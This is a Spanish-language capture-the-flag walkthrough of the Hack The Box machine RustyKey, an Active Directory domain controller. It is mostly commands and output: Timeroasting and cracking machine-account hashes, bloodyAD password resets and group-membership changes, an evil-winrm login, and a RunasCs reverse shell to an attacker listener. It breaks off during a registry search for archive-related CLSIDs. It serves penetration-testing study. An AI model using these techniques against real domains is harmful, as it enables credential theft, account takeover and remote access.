![image](https://github.com/user-attachments/assets/6cb230b2-dc95-4271-bd0b-9468d6c33822)

Nos conectamos a la vpn y comenzamos con un escaneo de `nmap`

```bash
nmap -Pn -n -sS -p- -sCV --min-rate 5000 10.10.11.75
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 05:27 -03
Nmap scan report for 10.10.11.75
Host is up (0.15s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 08:27:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-06T08:28:29
|_  start_date: N/A
|_clock-skew: -8s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.73 seconds
```

por la cantidad de puertos podemos ver que estamos frente a un `DC` y con las credenciales iniciales comenzamos hacer pruebas: `credenciales= rr.parker / 8#t5HE8L!W3A`
pero primero ajustamos nuestro archivo `/etc/hosts`

```bash
echo '10.10.11.75 DC rustykey.htb dc.rustykey.htb' >> /etc/hosts
```

luego sincronizamos nuestro reloj con el DC

```bash
ntpdate 10.10.11.75
```

ahora vamos testeando por `smb`

```bash
nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' --shares
```

```bash
SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.75     445    10.10.11.75      [-] 10.10.11.75\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED 
```

vamos a solicitar un ticket kerberos para autenticacion

```bash
impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
```
```bash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache

```

ahora seteamos la variable de entorno `KRB5CCNAME`

```bash
export KRB5CCNAME=rr.parker.ccache
```

ahora testeamos `ldap`

```bash
nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k --users
```
```bash
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.75     389    DC               Administrator                 2025-06-04 19:52:22 0        Built-in account for administering the computer/domain      
LDAP        10.10.11.75     389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.11.75     389    DC               krbtgt                        2024-12-26 21:53:40 0        Key Distribution Center Service Account                     
LDAP        10.10.11.75     389    DC               rr.parker                     2025-06-04 19:54:15 0                                                                    
LDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 07:18:39 0                                                                    
LDAP        10.10.11.75     389    DC               bb.morgan                     2025-07-06 05:31:39 0                                                                    
LDAP        10.10.11.75     389    DC               gg.anderson                   2025-07-06 05:31:39 0                                                                    
LDAP        10.10.11.75     389    DC               dd.ali                        2025-07-06 05:31:39 0                                                                    
LDAP        10.10.11.75     389    DC               ee.reed                       2025-07-06 05:31:39 0                                                                    
LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 08:34:50 0                                                                    
LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-29 21:30:18 0           
```

obtenemos usuarios y los guardamos en un archivo

```bash
nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k --users |grep -vE '[*]|[+]|-Username-' |awk '{print $5}' > users.txt
```
```bash
cat users.txt
```
```bash
Administrator
Guest
krbtgt
rr.parker
mm.turner
bb.morgan
gg.anderson
dd.ali
ee.reed
nn.marcos
backupadmin
```

en este punto despues de intentar varios vectores no obtengo resultaods hasta intentar con `Timeroast` 

```bash
Timeroast es un método de Kerberoasting que permite a un atacante extraer
hashes de contraseñas de cuentas de servicio en Active Directory,
aprovechando tareas programadas (scheduled tasks) registradas en Service
Principal Names (SPNs) vinculadas a objetos tipo msDS-ManagedServiceAccount
o Group Managed Service Accounts (gMSA)
```

para esto usaremos el script a continuacion:

https://github.com/SecuraBV/Timeroast

lo descargamos y lo ejecutamos

```python
python3 timeroast.py 10.10.11.75
```
```python
1000:$sntp-ms$886eaa18fc3352176cf361c793e83a11$1c0111e900000000000a0a424c4f434cec14adcf562e9a47e1b8428bffbfcd0aec14bb555a05956bec14bb555a05ace8
1103:$sntp-ms$310776f77586cde617fe21972c4b2d1b$1c0111e900000000000a0a434c4f434cec14adcf57c64345e1b8428bffbfcd0aec14bb56cbbe04b2ec14bb56cbbe18d4
1104:$sntp-ms$323d201cb43cca8a7cdf7da0b6996e56$1c0111e900000000000a0a434c4f434cec14adcf57f559b3e1b8428bffbfcd0aec14bb56cbed12bdec14bb56cbed344b
1105:$sntp-ms$a9e6227bfa19e5a36305ae3b365d4533$1c0111e900000000000a0a434c4f434cec14adcf5818fed4e1b8428bffbfcd0aec14bb56cc10b7deec14bb56cc10dcc7
1106:$sntp-ms$3af01242bdbd6e786448cd8b00d95b9f$1c0111e900000000000a0a434c4f434cec14adcf58369ac6e1b8428bffbfcd0aec14bb56cc2e4811ec14bb56cc2e7c14
1107:$sntp-ms$d46640859c49d6382f708de8c19f359f$1c0111e900000000000a0a434c4f434cec14adcf56d05d7be1b8428bffbfcd0aec14bb56ce9f16b1ec14bb56ce9f4ab3
1118:$sntp-ms$9a1733265fecb3cb32c05f0b166f9685$1c0111e900000000000a0a434c4f434cec14adcf5813ea98e1b8428bffbfcd0aec14bb56cfe2b643ec14bb56cfe2ca65
1119:$sntp-ms$ef1e1f7c1f2d43b118ef2da92d4a2e1b$1c0111e900000000000a0a434c4f434cec14adcf54cf398ee1b8428bffbfcd0aec14bb56d0b68cefec14bb56d0b6b533
1120:$sntp-ms$bb48e03b027ef3ed6912e536a4462d6c$1c0111e900000000000a0a434c4f434cec14adcf5586d2ede1b8428bffbfcd0aec14bb56d16e22f3ec14bb56d16e539a
1121:$sntp-ms$0481acb4f943f703e06193c31c27ad94$1c0111e900000000000a0a434c4f434cec14adcf55a87a07e1b8428bffbfcd0aec14bb56d18fcd67ec14bb56d18ff5ab
1122:$sntp-ms$444ede1329099dfb7f631b6bfa606cb9$1c0111e900000000000a0a434c4f434cec14adcf549563a9e1b8428bffbfcd0aec14bb56d495380bec14bb56d4957cd4
1123:$sntp-ms$e5520ed63fffea85325b039e0cb51697$1c0111e900000000000a0a434c4f434cec14adcf54a42c9ae1b8428bffbfcd0aec14bb56d4a411c2ec14bb56d4a43859
1124:$sntp-ms$259f5fae27495d14ea4bbbad0330d925$1c0111e900000000000a0a434c4f434cec14adcf54c99a12e1b8428bffbfcd0aec14bb56d4c98295ec14bb56d4c9a92b
1125:$sntp-ms$922873838b2615a9e22993ea17fe4063$1c0111e900000000000a0a434c4f434cec14adcf54e77772e1b8428bffbfcd0aec14bb56d8be46f8ec14bb56d8be9e35
1126:$sntp-ms$37a6dd4d4f4db252ec76b4c696f259cd$1c0111e900000000000a0a434c4f434cec14adcf5542967de1b8428bffbfcd0aec14bb56d9198288ec14bb56d919b181
1127:$sntp-ms$0fc6657374b723ae42a2530b916e1a78$1c0111e900000000000a0a434c4f434cec14adcf556a26e5e1b8428bffbfcd0aec14bb56d94117f8ec14bb56d9414544
```
ahora lo que hare sera extraer solo el hash y guardarlo en un archivo

```bash
python3 timeroast.py 10.10.11.75 |awk -F ':' '{print $2}' > hash.txt
```

ahora el problema es crackearlos ya que hashcat no tiene soporte y john tampoco, pero despues de una investigacion, existe una version bera de hashcat que tiene soporte

url: https://hashcat.net/beta/

nos descargamos el comprimido y al descomprimir vemos el binario `hashcat.bin` que usaremos para intentar crackear

```bash
./hashcat.bin --identify '$sntp-ms$922873838b2615a9e22993ea17fe4063$1c0111e900000000000a0a434c4f434cec14adcf54e77772e1b8428bffbfcd0aec14bb56d8be46f8ec14bb56d8be9e35'
```
```bash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  31300 | MS SNTP                                                    | Network Protocol

```

si lo reconoce asi que vamos a pasarle el archivo que contiene los hash

```bash
./hashcat.bin -m 31300 -a 0 -w 4 -d 1 /home/darks/Documents/htb/RustyKey/hash.txt /usr/share/wordlists/rockyou.txt
```
```bash
hashcat (v6.2.6-1087-gd3983edaf) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 12.4)
====================
* Device #01: NVIDIA GeForce RTX 4050 Laptop GPU, 5805/5898 MB, 20MCU

OpenCL API (OpenCL 3.0 CUDA 12.4.131) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #02: NVIDIA GeForce RTX 4050 Laptop GPU, skipped

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #03: cpu-haswell-13th Gen Intel(R) Core(TM) i7-13620H, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 16 digests; 16 unique digests, 16 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 863 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$sntp-ms$88526ef8fd393b743566c1349be23724$1c0111e900000000000a0b2d4c4f434cec14adcf58323f17e1b8428bffbfcd0aec14bc8be811508aec14bc8be811904b:Rusty88!
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 31300 (MS SNTP)
Hash.Target......: /home/darks/Documents/htb/RustyKey/hash.txt
Time.Started.....: Sun Jul  6 06:21:35 2025 (1 sec)
Time.Estimated...: Sun Jul  6 06:21:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   183.9 MH/s (1.17ms) @ Accel:1024 Loops:1 Thr:48 Vec:1
Recovered........: 1/16 (6.25%) Digests (total), 1/16 (6.25%) Digests (new), 1/16 (6.25%) Salts
Progress.........: 229510160/229510160 (100.00%)
Rejected.........: 0/229510160 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:15 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 014softball -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Temp: 36c Util: 31% Core:2235MHz Mem:8000MHz Bus:4

Started: Sun Jul  6 06:21:33 2025
Stopped: Sun Jul  6 06:21:37 2025
```

tenemos una password `Rusty88!` ahora vamos averiguar a quien pertenece dicha password con `bloodhound`

```bash
bloodhound-python  -u 'rr.parker' -p '8#t5HE8L!W3A' -k -d rustykey.htb -ns 10.10.11.75 -c ALl --zip
```
```bash
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 32S
INFO: Compressing output into 20250706063014_bloodhound.zip
```

lo cargamos en bloodhound la informacion extraida anteriormente y localizamos la cuenta con el RIP `1125` que corresponde al hash crackeado

![image](https://github.com/user-attachments/assets/6a0f46e8-c56f-444c-8755-4cff913360ab)


la password `Rusty88!` pertecene al usuario `IT-COMPUTER3` Y vemos mas informacion en bloodhound

![image](https://github.com/user-attachments/assets/fee84c7a-cd5c-4421-8958-5c8f0ba23193)


siguiendo las instrucciones de bloodhound podemos agregar el usuario `IT-COMPUTER3` al grupo `HELDESK`

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
```
```bash
[+] IT-COMPUTER3$ added to HELPDESK
```

ya agregado podemos seguir adelante 

![image](https://github.com/user-attachments/assets/d48daa7e-c2ef-463b-8b22-10545f55c970)

y aqui observamos que podemos cambiar la password de los usuarios, pero anteres vamos a solicitar un ticket kerberos para el usuario `IT-COMPUTER3`

```bash
impacket-getTGT rustykey.htb/'IT-COMPUTER3$':'Rusty88!'
```
```bash
[*] Saving ticket in IT-COMPUTER3$.ccache
```

seteamos la variable `KRB5CCNAME`

```bash
export KRB5CCNAME=IT-COMPUTER3\$.ccache
```

y ahora si procedemos a cambiar la password del usuario `gg.anderson`

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password gg.anderson 'Testing123@'
```
```bash
[+] Password changed successfully!
```

pero si ahora intentamos solicitar un ticket kerberos no es posible y si examinamos un poco mas en bloodhound veremos que el usuario `gg.anderson` pertecene al Grupo `IT` que es miembro del grupo `PROTECTED USERS`

![image](https://github.com/user-attachments/assets/589bc9e1-0dc7-4194-9a21-43861f2cb516)

Esto puede estar creando restricciones por lo que haremos sera salir del grupo `PROTECTED USERS`

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'
```

aqui sacamos el grupo `IT` del grupo `PROTECTED OBJECTS` y luego de intentar solicitar el ticket kerberos tampoco logramos resultados asi que cambiamos de usuario y testeamos con `bb.morgan` que pertenece a los mismo grupos

![image](https://github.com/user-attachments/assets/ac4e9198-c68c-4479-bfdc-1c53d46523ef)

haremos lo mismo que con el usuario anterior, primero cambiamos la password y luego solicitamos el ticket kerberos


>>> cambio de password
```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Testing123@'
```
```bash
[+] Password changed successfully!
```

>>> Solicitud de ticket kerberos
```bash
impacket-getTGT rustykey.htb/'bb.morgan':'Testing123@'
```
```bash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
                                          
```

ahora si hemos podido solicitarlo por lo que seteamos la variable de entorno `KRB5CCNAME`

```bash
export KRB5CCNAME=bb.morgan.ccache
```

ya con esto accedemos via `winrm`

```bash
evil-winrm -i dc.rustykey.htb -u 'bb.morgan' -r rustykey.htb
```

![image](https://github.com/user-attachments/assets/a4ddc078-e905-4d5a-953e-e2c97d9322e9)

no logro acceder, pero esto se debe a la falta de configuracion del archivo `/etc/krb5.conf` asi que lo configuramos de la siguiente manera

```bash
nano /etc/krb5.conf
```
```bash
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    RUSTYKEY.HTB = {
        kdc = 10.10.11.75
        admin_server = 10.10.11.75
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB

```

y volvemos intentar acceder via `winrm`

```bash
evil-winrm -i dc.rustykey.htb -u 'bb.morgan' -r rustykey.htb
```
```bash
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 


```

![image (3)](https://github.com/user-attachments/assets/f1a22afc-0242-44f2-b15f-9c09bb4c11aa)

obtenemos la primera flag y un archivo pdf que descargamos para leer

![image](https://github.com/user-attachments/assets/b534c9cf-6edd-4e61-9681-ae14f0c5821b)


lo que puedo deducir es que se le conseden permisos temporales privilegiados al grupo `support` y si regresamos a `bloodhount` vemos que el usuario `ee.reed` pertenece a ese grupo

![image](https://github.com/user-attachments/assets/3e9149fc-59d9-401b-b876-28ee7fd689bd)

por lo que podriamos cambiar la password de este usuario e intentar acceder via winrm como con el usuario `bb.morgan`

>>> Seteamos la variable KRB5CCNAME con el ticket de IT-COMPUTER3
```bash
export KRB5CCNAME=IT-COMPUTER3\$.ccache
```

>>> Cambiamos la password del usuario
```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Testing123@'
```

>>> solicitamos un ticket kerberos
```bash
impacket-getTGT rustykey.htb/'ee.reed':'Testing123@'
```
```bash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

y tenemos un error, pero es porque el grupo `SUPPORT` es miembro del Grupo `PROTECTED OBJECTS` asi que al igual que antes, salimos de ese grupo para evitar las restricciones

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'
```
```bash
[-] SUPPORT removed from PROTECTED OBJECTS
```

ahora volvemos a solicitar el ticket kerberos

```bash
impacket-getTGT rustykey.htb/'ee.reed':'Testing123@'
```
```bash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache
```
seteamos la variable de entorno KRB5CCNAME con el ticket generado

```bash
export KRB5CCNAME=ee.reed.ccache
```

e intentamos acceder via `winrm`

```bash
evil-winrm -i dc.rustykey.htb -u 'ee.reed' -r rustykey.htb
```
```bash
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success

                                        
Error: Exiting with code 1
malloc_consolidate(): unaligned fastbin chunk detected
zsh: IOT instruction  evil-winrm -i dc.rustykey.htb -u 'ee.reed' -r rustykey.htb
```

nos da error y no podemos llegar acceder via `winrm` con este usuario, pero aun queda una alternativa, usar `RunasCs.exe`

>>> Primero volvemos acceder via winrm como bb.morgan y cargamos el binario (recuerda cargar en la variable de entorno KRB5CCNAME el ticket del usuario bb.morgan para poder acceder via winrm)
```bash
upload /home/darks/Documents/htb/RustyKey/runas/RunasCs.exe
```
```bash
Info: Uploading /home/darks/Documents/htb/RustyKey/runas/RunasCs.exe to C:\Users\bb.morgan\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
```

nos colocamos en escucha desde nuestra maquina

```bash
nc -lnvp 4444
```

lanzamos la reverhsell con `RunasCs.exe`

```bash
.\RunasCs.exe ee.reed 'Testing123@' powershell -r 10.10.14.132:4444
```

y obtenemos la conexion en nuestra maquina como el usuario `ee.reed`

![image](https://github.com/user-attachments/assets/8c6927c8-8f3e-461a-a1d9-66f0d38ba59e)

ahora como este usuario pertenece al grupo `Support` y este grupo tiene privilegios para modificar claves de registro de extraccion/compresion, vamos a buscar en el registro de Windows todas las claves relacionadas con archivos rar o zip bajo las CLSIDs

```bash
reg query HKCR\CLSID /s /f "rar"
```
```bash
reg query HKCR\CLSID /s /f "rar"

HKEY_CLASSES_ROOT\CLSID\{031E4825-7B94-4dc3-B131-E946B44C8DD5}
    (Default)    REG_SZ    UsersLibraries

HKEY_CLASSES_ROOT\CLSID\{031E4825-7B94-4dc3-B131-E946B44C8DD5}\shell\restorelibraries

HKEY_CLASSES_ROOT\CLSID\{06290BD5-48AA-11D2-8432-006008C3FBFC}
    (Default)    REG_SZ    Object for constructing type libraries for scriptlets

HKEY_CLASSES_ROOT\CLSID\{09f209a1-d04d-4225-9333-076d72a7bb06}
    (Default)    REG_SZ    IPlayToReceiverAppRegistrar Factory

HKEY_CLASSES_ROOT\CLSID\{0af96ede-aebf-41ed-a1c8-cf7a685505b6}
    (Default)    REG_SZ    Library Folder Context Menu

HKEY_CLASSES_ROOT\CLSID\{0B2C35D2-C8BC-4470-BFC0-D6BB1235E5CE}
    (Default)    REG_SZ    Temporary Files Cleaner

HKEY_CLASSES_ROOT\CLSID\{14074e0b-7216-4862-96e6-53cada442a56}
    (Default)    REG_SZ    Library Icon Extract Extension

HKEY_CLASSES_ROOT\CLSID\{1D6322AD-AA85-4EF5-A828-86D71067D145}
    (Default)    REG_SZ    UIAnimationTransitionLibrary

HKEY_CLASSES_ROOT\CLSID\{204810b9-73b2-11d4-bf42-00b0d0118b56}
    (Default)    REG_SZ    UPnPRegistrar

HKEY_CLASSES_ROOT\CLSID\{2048EEE6-7FA2-11D0-9E6A-00A0C9138C29}
    (Default)    REG_SZ    Microsoft OLE DB Row Position Library

HKEY_CLASSES_ROOT\CLSID\{3dad6c5d-2167-4cae-9914-f99e41c12cfa}
    (Default)    REG_SZ    Include In Library Sub Context Menu

HKEY_CLASSES_ROOT\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}
    (Default)    REG_SZ    Registrar Class

HKEY_CLASSES_ROOT\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}\ProgID
    (Default)    REG_SZ    ATL.Registrar

HKEY_CLASSES_ROOT\CLSID\{464510d9-3477-4c8b-97cb-4b4c29f04354}
    (Default)    REG_SZ    MiracastReceiverAppRegistrar

HKEY_CLASSES_ROOT\CLSID\{4CFC7932-0F9D-4BEF-9C32-8EA2A6B56FCB}
    (Default)    REG_SZ    Microsoft WMI Provider Subsystem Decoupled Registrar

HKEY_CLASSES_ROOT\CLSID\{506229ae-09c7-4ffd-8ec9-6a957f6da601}
    (Default)    REG_SZ    Library Public Save Location verb

HKEY_CLASSES_ROOT\CLSID\{54E14197-88B0-442F-B9A3-86837061E2FB}
    (Default)    REG_SZ    CLSID_CoreShellCOMServerRegistrar

HKEY_CLASSES_ROOT\CLSID\{5569e7f5-424b-4b93-89ca-79d17924689a}
    (Default)    REG_SZ    Windows Media Player Plug-in Registrar

HKEY_CLASSES_ROOT\CLSID\{66275315-bfa5-451b-88b6-e56ebc8d9b58}
    (Default)    REG_SZ    Library Property Handler

HKEY_CLASSES_ROOT\CLSID\{69a568cf-86d1-4e47-b1fc-a74a110583fb}
    (Default)    REG_SZ    Manage Library verb

HKEY_CLASSES_ROOT\CLSID\{6aa17c06-0c75-4006-81a9-57927e77ae87}
    (Default)    REG_SZ    Change Library Icon verb

HKEY_CLASSES_ROOT\CLSID\{6D48E7F7-8ECD-404C-8E30-81C49E8E36EE}
    (Default)    REG_SZ    Windows.Storage.Search.StorageLibraryContentChangedTriggerDetails Factory

HKEY_CLASSES_ROOT\CLSID\{6e29fabf-9977-42d1-8d0e-ca7e61ad87e6}
    (Default)    REG_SZ    UIAutomation Registrar Class

HKEY_CLASSES_ROOT\CLSID\{740e40d8-5d9f-46be-98dd-39915e3c32ef}
    (Default)    REG_SZ    CLSID_StorageLibraryUI

HKEY_CLASSES_ROOT\CLSID\{7BD29E00-76C1-11CF-9DD0-00A0C9034933}
    (Default)    REG_SZ    Temporary Internet Files

HKEY_CLASSES_ROOT\CLSID\{7BD29E01-76C1-11CF-9DD0-00A0C9034933}
    (Default)    REG_SZ    Temporary Internet Files

HKEY_CLASSES_ROOT\CLSID\{811F592B-CDE7-4ca4-A6D4-7BB3F60AD8FB}
    (Default)    REG_SZ    Library Group Policy Shell Service Object

HKEY_CLASSES_ROOT\CLSID\{812F944A-C5C8-4CD9-B0A6-B3DA802F228D}
    (Default)    REG_SZ    UIAnimationTransitionLibrary2

HKEY_CLASSES_ROOT\CLSID\{83472593-4fe6-4f44-a14c-fc8d4b4ff3f5}
    (Default)    REG_SZ    Include In Library verb

HKEY_CLASSES_ROOT\CLSID\{84e04a55-2d42-4909-86e3-62fd11483e8b}
    (Default)    REG_SZ    Temporary Setup Files Cleanup

HKEY_CLASSES_ROOT\CLSID\{896664F7-12E1-490f-8782-C0835AFD98FC}
    (Default)    REG_SZ    Libraries delegate folder that appears in Users Files Folder

HKEY_CLASSES_ROOT\CLSID\{8DB2180F-BD29-11D1-8B7E-00C04FD7A924}
    (Default)    REG_SZ    COMComponentRegistrar Class

HKEY_CLASSES_ROOT\CLSID\{92ab5af7-a374-417e-b2e2-9b317353a322}
    (Default)    REG_SZ    Microsoft Library Boolean Check Mark Control

HKEY_CLASSES_ROOT\CLSID\{9a07804e-7050-41d5-a244-badc038df532}
    (Default)    REG_SZ    Library Restore Defaults verb

HKEY_CLASSES_ROOT\CLSID\{9B0EFD60-F7B0-11D0-BAEF-00C04FC308C9}
    (Default)    REG_SZ    Temporary Internet Files Cleaner

HKEY_CLASSES_ROOT\CLSID\{9e752621-4573-4308-81c6-9f210db29e85}
    (Default)    REG_SZ    Optimize Library For verb

HKEY_CLASSES_ROOT\CLSID\{A139E32E-EA10-4B93-A813-A9E44ADA2938}
    (Default)    REG_SZ    NPSMRegistrar Class

HKEY_CLASSES_ROOT\CLSID\{a5a3563a-5755-4a6f-854e-afa3230b199f}
    (Default)    REG_SZ    Library Folder

HKEY_CLASSES_ROOT\CLSID\{AD581B00-7B64-4E59-A38D-D2C5BF51DDB3}
    (Default)    REG_SZ    WindowsMediaLibrarySharingServices Class

HKEY_CLASSES_ROOT\CLSID\{AD581B00-7B64-4E59-A38D-D2C5BF51DDB3}\ProgID
    (Default)    REG_SZ    WMLSS.WindowsMediaLibrarySharingServices.1

HKEY_CLASSES_ROOT\CLSID\{AD581B00-7B64-4E59-A38D-D2C5BF51DDB3}\VersionIndependentProgID
    (Default)    REG_SZ    WMLSS.WindowsMediaLibrarySharingServices

HKEY_CLASSES_ROOT\CLSID\{B1F250C3-B7F8-4DA3-9C8D-382602F02424}
    (Default)    REG_SZ    Type Library Registration Reader

HKEY_CLASSES_ROOT\CLSID\{BD84B380-8CA2-1069-AB1D-08000948F534}\Hierarchical

HKEY_CLASSES_ROOT\CLSID\{c15e6bf0-6351-4588-ac4f-ef7d5ec8c16e}
    (Default)    REG_SZ    WMPlayer LibraryPropPage Class

HKEY_CLASSES_ROOT\CLSID\{c51b83e5-9edd-4250-b45a-da672ee3c70e}
    (Default)    REG_SZ    Restore Default Libraries Command

